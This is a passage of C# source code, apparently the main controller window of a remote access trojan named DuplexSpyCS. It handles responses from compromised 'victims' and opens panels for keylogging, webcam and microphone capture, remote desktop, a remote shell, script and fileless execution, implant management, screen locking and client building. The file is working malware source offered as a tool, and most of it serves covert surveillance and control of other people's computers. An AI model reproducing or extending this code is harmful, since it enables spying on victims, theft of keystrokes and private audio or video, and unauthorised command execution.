                                double db = double.Parse(cmd[4]);
                                byte[] buf_audio = Convert.FromBase64String(cmd[5]);
                                f.MicAudioPlay(db, buf_audio);
                            }
                            else if (cmd[3] == "mp3")
                            {
                                if (cmd[4] == "path")
                                {
                                    if (cmd[5] != "1")
                                        return;

                                    int code = int.Parse(cmd[6]);
                                    string msg = clsCrypto.b64D2Str(cmd[7]);

                                    if (code == 0)
                                    {
                                        MessageBox.Show(msg, "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                                        return;
                                    }

                                    f.ShowMicMp3FileName(msg);
                                }
                            }
                        }
                        else if (cmd[2] == "system")
                        {
                            if (cmd[3] == "buffer")
                            {
                                double db = double.Parse(cmd[4]);
                                byte[] buf_audio = Convert.FromBase64String(cmd[5]);
                                f.SysAudioPlay(db, buf_audio);
                            }
                            else if (cmd[3] == "mp3")
                            {
                                if (cmd[4] == "path")
                                {

                                    if (cmd[5] != "1")
                                        return;

                                    int code = int.Parse(cmd[6]);
                                    string msg = clsCrypto.b64D2Str(cmd[7]);

                                    if (code == 0)
                                    {
                                        MessageBox.Show(msg, "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                                        return;
                                    }

                                    f.ShowSysMp3FileName(msg);
                                }
                            }
                        }
                    }
                }

                #endregion
                #region Execution

                else if (cmd[0] == "exec")
                {
                    if (new string[] { "bat", "cs", "vb" }.Contains(cmd[1]))
                    {
                        frmRunScript f = (frmRunScript)clsTools.GetFormByVictim(v, Function.RunScript);
                        if (f == null)
                            return;

                        int code = int.Parse(cmd[2]);
                        string output = clsCrypto.b64D2Str(cmd[3]);

                        f.DisplayOutput(code, output);
                    }
                    else if (cmd[1] == "file")
                    {
                        if (cmd[2] == "output")
                        {
                            Invoke(new Action(() =>
                            {
                                frmInfoBox f = new frmInfoBox();
                                f.Show();

                                f.ShowInfo(clsCrypto.b64D2Str(cmd[3]), "Output", SystemIcons.Information);
                            }));
                        }
                    }
                }

                #endregion
                #region FunStuff

                else if (cmd[0] == "fun")
                {
                    frmFunStuff f = (frmFunStuff)clsTools.GetFormByVictim(v, Function.FunStuff);
                    if (f == null)
                        return;
                    if (cmd[1] == "screen")
                    {
                        if (cmd[2] == "lock")
                        {
                            int code = int.Parse(cmd[3]);
                            if (code == 0)
                            {
                                MessageBox.Show("Screen is unlocked", "Status", MessageBoxButtons.OK, MessageBoxIcon.Information);
                            }
                            else
                            {
                                MessageBox.Show("Screen is locked", "Status", MessageBoxButtons.OK, MessageBoxIcon.Information);
                            }
                        }
                    }
                    if (cmd[1] == "wp")
                    {
                        if (cmd[2] == "set")
                        {
                            int code = int.Parse(cmd[3]);
                            string msg = clsCrypto.b64D2Str(cmd[4]);

                            if (code == 0)
                            {
                                MessageBox.Show(msg, "Error - Wallpaper", MessageBoxButtons.OK, MessageBoxIcon.Error);
                                return;
                            }
                        }
                        else if (cmd[2] == "get")
                        {
                            int code = int.Parse(cmd[3]);
                            string msg = cmd[4];
                            string szB64Img = cmd[5];

                            if (code == 1)
                            {
                                Image img = clsTools.Base64ToImage(szB64Img);
                                Invoke(new Action(() =>
                                {
                                    SaveFileDialog sfd = new SaveFileDialog();
                                    sfd.InitialDirectory = v.dir_victim;
                                    sfd.FileName = "wallpaper.jpg";
                                    if (sfd.ShowDialog() == DialogResult.OK)
                                    {
                                        img.Save(sfd.FileName);
                                        MessageBox.Show("Save wallpaper successfully:\n" + sfd.FileName, "Save file", MessageBoxButtons.OK, MessageBoxIcon.Information);
                                    }
                                }));
                            }
                            else
                            {
                                MessageBox.Show(clsCrypto.b64D2Str(msg), "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                            }
                        }
                    }
                    else if (cmd[1] == "hwnd")
                    {
                        if (cmd[2] == "init")
                        {
                            string payload = cmd[3];

                            List<Tuple<string, string>> lsStatus = new List<Tuple<string, string>>();
                            foreach (string item in payload.Split(','))
                            {
                                if (string.IsNullOrEmpty(item))
                                    continue;

                                string[] split = item.Split(':');
                                Tuple<string, string> t = new Tuple<string, string>(split[0], split[1]);
                                lsStatus.Add(t);
                            }

                            f.ShowWndStatus(lsStatus);
                        }
                    }
                }

                #endregion
                #region DLL

                else if (cmd[0] == "dll")
                {
                    int nCode = int.Parse(cmd[1]);
                    string szMsg = clsCrypto.b64D2Str(cmd[2]);
                    MessageBox.Show(szMsg);
                }

                #endregion
                #region Fileless Execution

                else if (cmd[0] == "fle") //Fileless Execution
                {

                }

                #endregion
                #region Error

                else if (cmd[0] == "error")
                {
                    clsStore.sql_conn.WriteErrorLogs(v, clsCrypto.b64D2Str(cmd[1]));
                }

                #endregion
            }
            catch (Exception ex)
            {
                clsStore.sql_conn.WriteSysErrorLogs(ex.Message);
            }
        }

        public void fnImplantConnected(clsListener l, clsVictim v, List<string> lsMsg)
        {
            ListViewItem item = new ListViewItem(lsMsg[0]);
            item.SubItems.Add(v.socket.RemoteEndPoint.ToString());
            for (int i = 1; i < lsMsg.Count; i++)
                item.SubItems.Add(lsMsg[i]);
            item.Tag = v;

            Invoke(new Action(() =>
            {
                if (listView2.FindItemWithText(lsMsg[0]) != null)
                    return;

                listView2.Items.Add(item);
            }));
        }

        public void fnImplantDisconnected(clsVictim v)
        {
            try
            {
                Invoke(new Action(() =>
                {
                    ListViewItem item = listView2.FindItemWithText(v.ID);
                    if (item == null)
                        return;

                    listView2.Items.Remove(item);
                }));
            }
            catch (Exception ex)
            {

            }
        }

        /// <summary>
        /// Get victim of listviewitem tag.
        /// </summary>
        /// <param name="item"></param>
        /// <returns></returns>
        clsVictim GetVictim(ListViewItem item)
        {
            return (clsVictim)item.Tag;
        }

        /// <summary>
        /// Cutoff the selected socket.
        /// </summary>
        /// <param name="v"></param>
        public void fnDisconnected(clsVictim v)
        {
            v.socket.Close();
            clsStore.sql_conn.WriteSystemLogs($"[{clsTools.DateTimeStrEnglish()}]: Disconnected: {v.ID}");

            if (v == null)
                return;

            Invoke(new Action(() =>
            {
                try
                {
                    ListViewItem item = listView1.FindItemWithText(v.ID);
                    if (item != null)
                        item.Remove();
                }
                catch (Exception ex)
                {

                }
            }));
        }

        private void OnFormCountChanged(object sender, FormCountChangedEventArgs e)
        {
            Console.WriteLine($"Number of open forms: {e.CurrentFormCount}");
        }

        protected override void OnClosed(EventArgs e)
        {

        }

        //Setup DuplexSpyCS Server
        void fnSetup()
        {
            //listView1.OwnerDraw = true;
            //ColorStyle(color_style, this);

            toolStripLabel1.Text = string.Empty; //Sent Bytes
            toolStripLabel2.Text = string.Empty; //Received Bytes

            //Config file
            try
            {
                clsStore.ini_manager = new clsIniManager("config.ini");
            }
            catch (FileNotFoundException ex)
            {
                DialogResult dr = MessageBox.Show("config.ini not found.\nDo you want to open existed ini file? Click no to build ini file automatically.", "File Not Found", MessageBoxButtons.YesNo, MessageBoxIcon.Warning);
                if (dr == DialogResult.Yes)
                {
                    OpenFileDialog ofd = new OpenFileDialog();
                    ofd.Multiselect = false;
                    ofd.Filter = "INI File(*.ini)|*.ini";
                    if (ofd.ShowDialog() == DialogResult.OK)
                    {
                        clsStore.ini_manager = new clsIniManager(ofd.FileName);
                    }
                    else
                    {
                        MessageBox.Show("No file is selected, close DuplexSpyCS", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                        Close(); //Exit
                    }
                }
                else
                {
                    //Todo: Build ini file automatically.
                    //Release default ini file from resource.
                }
            }

            m_sqlConn = new clsSqlConn("data.db"); //Set database.
            m_sqlConn.Open();

            timer1.Start();
            timer2.Start();

            clsStore.sql_conn = m_sqlConn;

            //todo: load listener

            //Display remote desktop
            listView1.SmallImageList = il_screen; //Detail mode.
            listView1.LargeImageList = il_screen; //LargeIcon mode.
            listView1.Columns[0].Width = listView1.Font.Height;
            screen_width = listView1.Columns[0].Width;

            DateTime now = DateTime.Now;
            clsStore.dtStartUp = now;
            clsStore.sql_conn.NewLogs(clsSqlConn.CSV.Server, clsSqlConn.MsgType.System, $"Setup finished at: {now.ToString("yyyy-MM-dd HH:mm:ss")}");
        }

        private void frmMain_Load(object sender, EventArgs e)
        {
            fnSetup();
        }

        //MANAGER
        private void toolStripMenuItem1_Click(object sender, EventArgs e)
        {
            foreach (ListViewItem item in listView1.SelectedItems)
            {
                clsVictim victim = GetVictim(item);
                frmManager f = clsTools.fnFindForm<frmManager>(victim);
                if (f == null)
                {
                    f = new frmManager(victim);
                    f.Text = $@"Manager\\{victim.ID}";
                    f.Tag = Function.Manager;

                    f.Show();
                }
                else
                {
                    f.BringToFront();
                }
            }
        }

        private void toolStripMenuItem2_Click(object sender, EventArgs e)
        {

        }

        //LISTEN
        private void toolStripButton1_Click(object sender, EventArgs e)
        {
            /*
            frmListen f = new frmListen();
            f.frmMain = this;

            if (f.ShowDialog() == DialogResult.OK)
            {
                string ip = f.ip;
                int port = f.port;
                if (listener != null && listener.socket != null && listener.socket.IsBound)
                {
                    if (port == listener.m_nPort)
                    {
                        MessageBox.Show("This port is in used!", "Bind Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                        return;
                    }

                    List<clsVictim> lsVictim = listView1.Items.Cast<ListViewItem>().Select(x => GetVictim(x)).ToList();
                    listener.fnStop();

                    //todo: listener
                }

                listener.fnStart();
            }

            */

            frmListener f = new frmListener(m_sqlConn, this);
            f.Show();
        }

        //BUILD
        private void toolStripButton2_Click(object sender, EventArgs e)
        {
            frmBuild f = new frmBuild();
            f.Text = "Build Client";

            f.ShowDialog();
        }

        //DESKTOP
        private void toolStripMenuItem3_Click(object sender, EventArgs e)
        {
            foreach (ListViewItem item in listView1.SelectedItems)
            {
                if (item.SubItems[8].Text == "0")
                {
                    MessageBox.Show("Count of monitor is zero.", "Monitor not found.", MessageBoxButtons.OK, MessageBoxIcon.Error);
                    continue;
                }

                clsVictim v = GetVictim(item);
                frmDesktop f = clsTools.fnFindForm<frmDesktop>(v);
                if (f == null)
                {
                    f = new frmDesktop(v);
                    f.Text = $@"Desktop\\{v.ID}";
                    f.Tag = Function.Desktop;
                    f.v = v;

                    f.Show();
                }
                else
                {
                    f.BringToFront();
                }
            }
        }

        private void timer1_Tick(object sender, EventArgs e)
        {
            string szPorts = m_dicListener.Keys.Count == 0 ? string.Empty : string.Join(", ", m_dicListener.Keys.Select(x => m_dicListener[x]).Where(x => x.m_bIslistening).Select(x => x.m_nPort.ToString()));

            Text = $"DuplexSpyCS v2.0.0 by ISSAC | " +
                $"Port[{szPorts}] | " +
                $"Online[{listView1.Items.Count}] - " +
                $"Implant[{listView2.Items.Count}] - " +
                $"Total[{(listView1.Items.Count + listView2.Items.Count)}] | " +
                $"Selected({tabControl1.SelectedTab.Text}) [{(tabControl1.SelectedIndex == 0 ? listView1.SelectedItems.Count : listView2.SelectedItems.Count)}]";
        }

        private void listView1_ColumnWidthChanging(object sender, ColumnWidthChangingEventArgs e)
        {
            if (e.ColumnIndex != 0)
                return;

            int width = listView1.Columns[0].Width;
            if (width < 25)
            {
                width = 25;
            }

            if (width < 256)
            {
                il_screen.ImageSize = new Size(width, width);
                screen_width = width;
            }
        }

        //VIEW - LARGE ICON
        private void toolStripMenuItem4_Click(object sender, EventArgs e)
        {
            listView1.View = View.LargeIcon;
            screen_BigWidth = 255;
            il_screen.ImageSize = new Size(screen_BigWidth, screen_BigWidth);
            listView1.Columns[0].Width = screen_BigWidth;
            foreach (ListViewItem item in listView1.Items)
                item.Text = item.SubItems[1].Text + "@" + item.SubItems[3].Text;

            listView1.Refresh();
        }

        //VIEW - DETAIL
        private void toolStripMenuItem5_Click(object sender, EventArgs e)
        {
            listView1.View = View.Details;
            listView1.Columns[0].Width = screen_width;

            //il_screen.ImageSize = new Size(screen_width, screen_width);

            foreach (ListViewItem item in listView1.Items)
                item.Text = string.Empty;

            listView1.Refresh();
        }

        //WEBCAM
        private void toolStripMenuItem8_Click(object sender, EventArgs e)
        {
            foreach (ListViewItem item in listView1.SelectedItems)
            {
                if (item.SubItems[9].Text != "0")
                {
                    clsVictim v = GetVictim(item);
                    frmWebcam f = new frmWebcam(v);
                    if (f == null)
                    {
                        f = new frmWebcam(v);
                        f.Text = $@"Webcam\\{v.ID}";
                        f.v = v;
                        f.Text = @$"{item.SubItems[1].Text}\\Webcam";

                        f.Show();
                    }
                    else
                    {
                        f.BringToFront();
                    }
                }
                else
                {
                    MessageBox.Show($"{item.SubItems[1].Text}: Webcam not found!");
                }
            }
        }

        //INFORMATION
        private void toolStripMenuItem6_Click(object sender, EventArgs e)
        {
            foreach (ListViewItem item in listView1.SelectedItems)
            {
                clsVictim v = GetVictim(item);
                frmInfo f = clsTools.fnFindForm<frmInfo>(v);
                if (f == null)
                {
                    f = new frmInfo(v);
                    f.Text = $@"Information\\{v.ID}";
                    f.StartPosition = FormStartPosition.CenterScreen;

                    f.Show();
                }
                else
                {
                    f.BringToFront();
                }
            }
        }

        //FUN STUFF
        private void toolStripMenuItem7_Click(object sender, EventArgs e)
        {
            foreach (ListViewItem item in listView1.SelectedItems)
            {
                clsVictim victim = GetVictim(item);
                frmFunStuff f = clsTools.fnFindForm<frmFunStuff>(victim);

                if (f == null)
                {
                    f.Text = @$"FunStuff\\{f.v.ID}";
                    f.StartPosition = FormStartPosition.CenterScreen;
                    f.Show();
                }
                else
                {
                    f.BringToFront();
                }
            }
        }

        //UPDATE SENT/RECEIVED BYTES PER SECOND
        private void timer2_Tick(object sender, EventArgs e)
        {
            toolStripLabel1.Text = $"Sent Bytes[{clsTools.BytesNormalize(clsStore.sent_bytes)}]";
            toolStripLabel2.Text = $"Received Bytes[{clsTools.BytesNormalize(clsStore.recv_bytes)}]";

            clsStore.sent_bytes = 0;
            clsStore.recv_bytes = 0;
        }

        //SHOW LOGS
        private void toolStripButton5_Click(object sender, EventArgs e)
        {
            frmLogs f = new frmLogs();
            f.Text = "Log Viewer";
            f.StartPosition = FormStartPosition.CenterScreen;
            f.Show();
        }

        //KEY LOGGER
        private void toolStripMenuItem12_Click(object sender, EventArgs e)
        {
            foreach (ListViewItem item in listView1.SelectedItems)
            {
                clsVictim victim = GetVictim(item);
                frmKeyLogger f = clsTools.fnFindForm<frmKeyLogger>(victim);
                if (f == null)
                {
                    f = new frmKeyLogger(victim);
                    f.Text = $@"Keylogger\\{f.v.ID}";
                    f.StartPosition = FormStartPosition.CenterScreen;

                    f.Show();
                }
                else
                {
                    f.BringToFront();
                }
            }
        }

        //CHAT
        private void toolStripMenuItem13_Click(object sender, EventArgs e)
        {
            foreach (ListViewItem item in listView1.SelectedItems)
            {
                clsVictim v = GetVictim(item);
                frmChat f = clsTools.fnFindForm<frmChat>(v);
                if (f == null)
                {
                    f = new frmChat(v);
                    f.Text = $@"Chat\\{v.ID}";
                    f.Tag = Function.Chat;
                    f.StartPosition = FormStartPosition.CenterScreen;

                    f.Show();
                }
                else
                {
                    f.BringToFront();
                }
            }
        }

        //MULTI - DESKTOP
        private void toolStripMenuItem14_Click(object sender, EventArgs e)
        {
            if (listView1.SelectedItems.Count == 0)
                return;

            List<clsVictim> list = new List<clsVictim>();
            foreach (ListViewItem item in listView1.SelectedItems)
                list.Add(GetVictim(item));

            frmMultiDesktop f = new frmMultiDesktop();
            f.l_victim = list;
            f.Tag = Function.MultiDesktop;
            f.StartPosition = FormStartPosition.CenterScreen;
            f.Text = @$"MultiDesktop[{list.Count}]";

            f.Show();
        }

        //MULTI - WEBCAM
        private void toolStripMenuItem15_Click(object sender, EventArgs e)
        {
            if (listView1.SelectedItems.Count == 0)
                return;

            List<clsVictim> l_victim = new List<clsVictim>();
            foreach (ListViewItem item in listView1.SelectedItems.Cast<ListViewItem>().Where(x => x.SubItems[9].Text != "0").ToArray())
                l_victim.Add(GetVictim(item));

            if (l_victim.Count == 0)
            {
                MessageBox.Show("Cannot find any webcam", "Empty", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return;
            }

            frmMultiWebcam f = new frmMultiWebcam();
            f.Tag = Function.MultiWebcam;
            f.l_victim = l_victim;
            f.StartPosition = FormStartPosition.CenterScreen;
            f.Text = $@"MultiWebcam\\{l_victim.Count}";

            f.Show();
        }

        //MULTI - LOCK SCREEN
        private void toolStripMenuItem17_Click(object sender, EventArgs e)
        {
            List<clsVictim> l_victim = new List<clsVictim>();
            if (l_victim.Count == 0)
                return;

            foreach (ListViewItem item in listView1.SelectedItems)
                l_victim.Add(GetVictim(item));
            frmMultiLockScreen f = new frmMultiLockScreen();
            f.l_victim = l_victim;
            f.Text = @$"LockScreen";

            f.Show();
        }

        private void listView1_DrawColumnHeader(object sender, DrawListViewColumnHeaderEventArgs e)
        {
            using (SolidBrush brush = new SolidBrush(Color.Black))
            {
                e.Graphics.FillRectangle(brush, e.Bounds);
            }

            TextRenderer.DrawText(
                e.Graphics,
                e.Header.Text,
                e.Font,
                e.Bounds,
                Color.White,
                TextFormatFlags.VerticalCenter | TextFormatFlags.Left);

            using (Pen pen = new Pen(Color.Gray))
            {
                e.Graphics.DrawRectangle(pen, e.Bounds);
            }
        }

        private void listView1_DrawItem(object sender, DrawListViewItemEventArgs e)
        {
            e.DrawDefault = true;
        }

        private void listView1_DrawSubItem(object sender, DrawListViewSubItemEventArgs e)
        {
            Color backColor = e.ColumnIndex % 2 == 0 ? Color.LightYellow : Color.LightGreen;

            using (SolidBrush brush = new SolidBrush(backColor))
            {
                e.Graphics.FillRectangle(brush, e.Bounds);
            }

            e.Graphics.DrawString(e.SubItem.Text, e.Item.Font, Brushes.Black, e.Bounds);
        }

        //REMOTE SHELL
        private void toolStripMenuItem20_Click(object sender, EventArgs e)
        {
            foreach (ListViewItem item in listView1.SelectedItems)
            {
                frmShell f = new frmShell();
                f.Tag = Function.Shell;
                f.v = GetVictim(item);
                f.Text = @$"Shell\\{f.v.ID}";
                f.StartPosition = FormStartPosition.CenterScreen;

                f.Show();
            }
        }

        //CLIENT CONFIG
        private void toolStripMenuItem11_Click(object sender, EventArgs e)
        {
            foreach (ListViewItem item in listView1.SelectedItems)
            {
                clsVictim victim = GetVictim(item);
                frmClientConfig f = clsTools.fnFindForm<frmClientConfig>(victim);
                if (f == null)
                {
                    f = new frmClientConfig(victim);
                    f.Text = $@"ClientConfig\\{victim.ID}";
                    f.StartPosition = FormStartPosition.CenterScreen;

                    f.Show();
                }
                else
                {
                    f.BringToFront();
                }
            }
        }

        //WMI
        private void toolStripMenuItem22_Click(object sender, EventArgs e)
        {
            foreach (ListViewItem item in listView1.SelectedItems)
            {
                clsVictim v = GetVictim(item);
                frmWMI f = clsTools.fnFindForm<frmWMI>(v);
                if (f == null)
                {
                    f = new frmWMI(v);
                    f.StartPosition = FormStartPosition.CenterScreen;
                    f.Text = $@"WMI\\{v.ID}";

                    f.Show();
                }
                else
                {
                    f.BringToFront();
                }
            }
        }

        //AUDIO
        private void toolStripMenuItem24_Click(object sender, EventArgs e)
        {
            foreach (ListViewItem item in listView1.SelectedItems)
            {
                clsVictim victim = GetVictim(item);
                frmAudio f = clsTools.fnFindForm<frmAudio>(victim);
                if (f == null)
                {
                    f = new frmAudio(victim);
                    f.Text = @$"Audio\\{victim.ID}";
                    f.StartPosition = FormStartPosition.CenterScreen;

                    f.Show();
                }
                else
                {
                    f.BringToFront();
                }
            }
        }

        //MULTI - RUN BATCH SCRIPT
        private void toolStripMenuItem23_Click(object sender, EventArgs e)
        {
            List<clsVictim> lsVictim = listView1.SelectedItems.Cast<ListViewItem>().Select(x => GetVictim(x)).ToList();
            if (lsVictim.Count == 0)
                return;

            frmMultiRunScript f = new frmMultiRunScript();
            f.lsVictim = lsVictim;
            f.StartPosition = FormStartPosition.CenterScreen;
            f.Text = "MultiRunScript";

            f.Show();
        }

        //POWER
        private void toolStripMenuItem26_Click(object sender, EventArgs e)
        {
            foreach (ListViewItem item in listView1.SelectedItems)
            {
                clsVictim v = GetVictim(item);
                frmPower f = clsTools.fnFindForm<frmPower>(v);
                if (f == null)
                {
                    f = new frmPower(v);
                    f.Text = @$"Power\\{v.ID}";
                    f.StartPosition = FormStartPosition.CenterScreen;

                    f.Show();
                }
                else
                {
                    f.BringToFront();
                }
            }
        }

        //SYSTEM
        private void toolStripMenuItem25_Click(object sender, EventArgs e)
        {
            foreach (ListViewItem item in listView1.SelectedItems)
            {
                clsVictim victim = GetVictim(item);
                frmSystem f = clsTools.fnFindForm<frmSystem>(victim);
                if (f == null)
                {
                    f = new frmSystem(victim);
                    f.Text = $@"System\\{f.v.ID}";
                    f.Show();
                }
                else
                {
                    f.BringToFront();
                }
            }
        }

        //SETTING
        private void toolStripButton3_Click(object sender, EventArgs e)
        {
            frmSetting f = new frmSetting();
            f.Text = "Setting";
            f.ShowDialog();
        }

        //ABOUT
        private void toolStripButton4_Click(object sender, EventArgs e)
        {
            frmAbout f = new frmAbout();
            f.Text = "About";
            f.StartPosition = FormStartPosition.CenterScreen;
            f.Show();
        }

        //Reconnect
        private void toolStripMenuItem28_Click(object sender, EventArgs e)
        {
            foreach (ListViewItem item in listView1.SelectedItems)
            {
                clsVictim v = GetVictim(item);
                v.Send(0, 1, string.Empty);
            }
        }
        //Disconnect
        private void toolStripMenuItem29_Click(object sender, EventArgs e)
        {
            foreach (ListViewItem item in listView1.SelectedItems)
            {
                clsVictim v = GetVictim(item);
                v.Send(0, 0, string.Empty);
            }
        }

        //Run Script
        private void toolStripMenuItem21_Click(object sender, EventArgs e)
        {
            foreach (ListViewItem item in listView1.SelectedItems)
            {
                clsVictim victim = GetVictim(item);
                frmRunScript f = clsTools.fnFindForm<frmRunScript>(victim);
                if (f == null)
                {
                    f = new frmRunScript(victim);
                    f.v = GetVictim(item);
                    f.Text = $@"RunScript\\{victim.ID}";
                    f.StartPosition = FormStartPosition.CenterScreen;

                    f.Show();
                }
                else
                {
                    f.BringToFront();
                }
            }
        }

        //Open folder
        private void toolStripMenuItem18_Click(object sender, EventArgs e)
        {
            foreach (ListViewItem item in listView1.SelectedItems)
            {
                clsVictim v = GetVictim(item);
                Process.Start("explorer.exe", $"\"{v.dir_victim}\"");
            }
        }

        private void toolStripMenuItem19_Click(object sender, EventArgs e)
        {
            foreach (ListViewItem item in listView1.SelectedItems)
            {
                if (item.BackColor == listView1.BackColor)
                    item.BackColor = Color.IndianRed;
                else
                    item.BackColor = listView1.BackColor;
            }
        }

        //Highlight - yes
        private void toolStripMenuItem30_Click(object sender, EventArgs e)
        {
            foreach (ListViewItem item in listView1.SelectedItems)
            {
                item.BackColor = Color.IndianRed;
            }
        }
        //Highlight - now
        private void toolStripMenuItem31_Click(object sender, EventArgs e)
        {
            foreach (ListViewItem item in listView1.SelectedItems)
            {
                item.BackColor = listView1.BackColor;
            }
        }

        private void toolStripMenuItem32_Click(object sender, EventArgs e)
        {
            List<clsVictim> lsVictim = new List<clsVictim>();
            foreach (ListViewItem item in listView1.SelectedItems)
                lsVictim.Add(GetVictim(item));

            frmMultiURL f = new frmMultiURL();
            f.m_lsVictim = lsVictim;
            f.frmMain = this;
            f.Text = "MultiURL";
            f.StartPosition = FormStartPosition.CenterScreen;

            f.Show();
        }

        //Sleep
        private void toolStripMenuItem34_Click(object sender, EventArgs e)
        {
            frmClntSleep f = new frmClntSleep();
            f.Text = "Client Sleep";
            f.StartPosition = FormStartPosition.CenterScreen;
            f.m_lsVictim = GetAllVictim();

            f.Show();
        }
        //Update
        private void toolStripMenuItem35_Click(object sender, EventArgs e)
        {
            frmClntUpdate f = new frmClntUpdate();
            f.Text = "Client Update";
            f.StartPosition = FormStartPosition.CenterScreen;
            f.m_lsVictim = GetAllVictim();

            f.Show();
        }
        //Remove
        private void toolStripMenuItem36_Click(object sender, EventArgs e)
        {
            frmClntRemove f = new frmClntRemove();
            f.Text = "Client Remove";
            f.StartPosition = FormStartPosition.CenterScreen;
            f.m_lsVictim = GetAllVictim();

            f.Show();
        }

        //Copy - Online ID
        private void toolStripMenuItem38_Click(object sender, EventArgs e)
        {
            string szText = string.Join(Environment.NewLine, listView1.SelectedItems.Cast<ListViewItem>().Select(x => x.SubItems[1].Text).ToArray());
            Clipboard.SetText(szText);
        }
        //Copy - IP
        private void toolStripMenuItem39_Click(object sender, EventArgs e)
        {
            string szText = string.Join(Environment.NewLine, listView1.SelectedItems.Cast<ListViewItem>().Select(x => x.SubItems[3].Text).ToArray());
            Clipboard.SetText(szText);
        }
        //Copy - OS
        private void toolStripMenuItem41_Click(object sender, EventArgs e)
        {
            string szText = string.Join(Environment.NewLine, listView1.SelectedItems.Cast<ListViewItem>().Select(x => x.SubItems[5].Text).ToArray());
            Clipboard.SetText(szText);
        }

        private void toolStripMenuItem40_Click(object sender, EventArgs e)
        {
            List<clsVictim> lsVictim = fnlsGetSelectedVictims();
            if (lsVictim.Count == 0)
                return;

            frmFilelessExec f = new frmFilelessExec();
            f.m_lsVictim = lsVictim;

            f.Show();
        }

        private void toolStripButton6_Click(object sender, EventArgs e)
        {
            frmTipoff f = new frmTipoff(listener);
            f.Text = "Tipoff Request";
            f.Show();
        }

        //Implant - Invoke
        private void toolStripMenuItem42_Click(object sender, EventArgs e)
        {
            List<clsVictim> lVictim = listView2.SelectedItems.Cast<ListViewItem>().Select(x => (clsVictim)x.Tag).ToList();
            if (lVictim.Count == 0)
                return;

            frmImplantInvoke f = new frmImplantInvoke(lVictim);
            f.Show();
        }
        //Implant - Disconnect
        private void toolStripMenuItem43_Click(object sender, EventArgs e)
        {
            List<clsVictim> lVictim = listView2.SelectedItems.Cast<ListViewItem>().Select(x => (clsVictim)x.Tag).ToList();

            Task.Run(() =>
            {
                foreach (clsVictim v in lVictim)
                {
                    v.encSend(0, 0, clsEZData.fnGenerateRandomStr());
                }
            });
        }

        private void toolStripMenuItem44_Click(object sender, EventArgs e)
        {
            List<clsVictim> ls = listView1.SelectedItems.Cast<ListViewItem>().Select(x => (clsVictim)x.Tag).ToList();

            foreach (var victim in ls)
            {
                frmPlugin f = new frmPlugin(victim);
                f.Show();
            }
        }

        private void toolStrip2_ItemClicked(object sender, ToolStripItemClickedEventArgs e)
        {

        }

        private void toolStripMenuItem45_Click(object sender, EventArgs e)
        {
            List<clsVictim> ls = listView1.SelectedItems.Cast<ListViewItem>().Select(x => (clsVictim)x.Tag).ToList();

            foreach (var victim in ls)
            {
                frmXterm f = clsTools.fnFindForm<frmXterm>(victim);
                if (f == null)
                {
                    f = new frmXterm(victim);

                    f.Show();
                }

                f.BringToFront();
            }
        }
    }
}